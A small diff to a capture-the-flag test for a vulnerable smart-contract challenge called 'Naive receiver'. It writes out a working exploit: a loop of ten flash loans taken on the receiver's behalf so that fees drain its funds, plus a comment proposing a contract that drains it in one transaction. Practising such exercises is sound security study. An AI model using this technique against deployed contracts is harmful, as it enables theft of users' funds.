@@ -56,7 +56,12 @@ describe('[Challenge] Naive receiver', function () {
   it('Execution', async function () {
     /** CODE YOUR SOLUTION HERE */
     const ETH = await pool.ETH()
-    await pool.connect(player).flashLoan(receiver.address, ETH, 0, '0x')
+
+    for (let i = 0; i < 10; i++) {
+      await pool.connect(player).flashLoan(receiver.address, ETH, 0, '0x')
+    }
+    // In order to drain the receiver contract in a single tx we can create a custom
+    // contract that takes flash loans until the receiver is out of funds
   })
 
   after(async function () {
